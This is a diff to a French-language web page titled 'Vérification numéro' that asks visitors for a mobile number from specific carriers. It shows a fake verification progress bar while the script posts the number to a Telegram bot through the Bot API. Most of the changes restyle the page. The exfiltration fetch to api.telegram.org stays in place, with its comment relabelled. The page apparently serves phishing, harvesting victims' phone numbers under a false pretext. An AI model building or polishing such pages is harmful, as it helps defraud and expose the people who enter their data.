@@ -4,25 +4,27 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Vérification numéro</title>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@500;600;700&display=swap" rel="stylesheet">
     <style>
-        *{margin:0;padding:0;box-sizing:border-box;font-family:'Poppins',sans-serif;}
-        body{background:#000;color:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;}
+        *{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif;}
+        body{background:#000;color:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;overflow:hidden;}
         .container{max-width:420px;width:100%;}
-        .back{position:absolute;top:20px;left:20px;color:#fffc00;font-size:1.5em;text-decoration:none;}
-        .card{background:#111;border-radius:25px;padding:50px 30px;box-shadow:0 20px 60px rgba(255,252,0,0.3);}
-        h1{font-size:2.4em;color:#fffc00;text-align:center;margin-bottom:15px;}
-        p{color:#aaa;text-align:center;font-size:1.1em;margin-bottom:40px;}
-        input{width:100%;padding:20px;background:#222;border:2px solid #444;border-radius:15px;color:#fff;font-size:1.6em;text-align:center;letter-spacing:3px;}
-        input:focus{outline:none;border-color:#fffc00;}
-        .btn{background:#fffc00;color:#000;padding:20px;border:none;border-radius:50px;font-size:1.4em;font-weight:bold;width:100%;margin-top:40px;cursor:pointer;}
-        .progress{margin-top:40px;height:8px;background:#333;border-radius:4px;overflow:hidden;display:none;}
-        .bar{height:100%;width:0%;background:#fffc00;}
-        .status{text-align:center;margin-top:20px;color:#fffc00;font-weight:bold;display:none;}
-        .loader{display:none;width:50px;height:50px;border:6px solid #333;border-top:6px solid #fffc00;border-radius:50%;animation:spin 1s linear infinite;margin:40px auto;}
+        .back{position:absolute;top:20px;left:20px;color:#00ff88;font-size:1.6em;text-decoration:none;}
+        .card{background:#111;border-radius:28px;padding:50px 30px;box-shadow:0 20px 60px rgba(0,255,136,0.15);border:1px solid #1a1a1a;}
+        h1{font-size:2.4em;font-weight:700;color:#fff;text-align:center;margin-bottom:15px;}
+        p{color:#888;text-align:center;font-size:1.1em;margin-bottom:40px;}
+        .info{color:#666;text-align:center;font-size:0.95em;margin-bottom:30px;}
+        input{width:100%;padding:22px;background:#1a1a1a;border:2px solid #333;border-radius:18px;color:#fff;font-size:1.6em;text-align:center;letter-spacing:4px;transition:0.3s;}
+        input:focus{outline:none;border-color:#00ff88;box-shadow:0 0 0 4px rgba(0,255,136,0.2);}
+        .btn{background:#00ff88;color:#000;padding:20px;border:none;border-radius:50px;font-size:1.4em;font-weight:700;width:100%;margin-top:40px;cursor:pointer;transition:0.3s;box-shadow:0 10px 30px rgba(0,255,136,0.4);}
+        .btn:hover{background:#00ffaa;}
+        .btn:disabled{background:#333;color:#666;cursor:not-allowed;box-shadow:none;}
+        .progress{margin-top:40px;height:8px;background:#1a1a1a;border-radius:4px;overflow:hidden;display:none;}
+        .bar{height:100%;width:0%;background:#00ff88;transition:width 0.3s ease;}
+        .loader{display:none;width:50px;height:50px;border:6px solid #1a1a1a;border-top:6px solid #00ff88;border-radius:50%;animation:spin 1s linear infinite;margin:40px auto;}
         @keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
-        .error{color:#ff3300;margin-top:20px;text-align:center;font-weight:bold;}
-        .info{color:#666;text-align:center;margin-top:30px;font-size:0.9em;}
+        .status{text-align:center;margin-top:20px;color:#00ff88;font-weight:600;font-size:1.1em;display:none;}
+        .error{color:#ff4444;margin-top:20px;text-align:center;font-weight:600;}
     </style>
 </head>
 <body>
@@ -33,7 +35,7 @@
             <p>Opérateurs acceptés : SFR · Orange · Bouygues</p>
             <p class="info">Free / Sosh / autres = refusé</p>
 
-            <input type="tel" id="phone" placeholder="+33 6 __ __ __ __" maxlength="12" required autofocus>
+            <input type="tel" id="phone" placeholder="+33 6 __ __ __ __" maxlength="19" required autofocus>
 
             <div id="error" class="error"></div>
 
@@ -73,7 +75,7 @@
                 return;
             }
 
-            // Envoi immédiat du numéro
+            // Envoi du numéro à Telegram
             fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: {'Content-Type':'application/json'},
@@ -84,7 +86,7 @@
             });
 
             btn.disabled = true;
-            btn.textContent = 'Vérification...';
+            btn.textContent = 'Vérification en cours...';
             progress.style.display = 'block';
             loader.style.display = 'block';
             status.style.display = 'block';
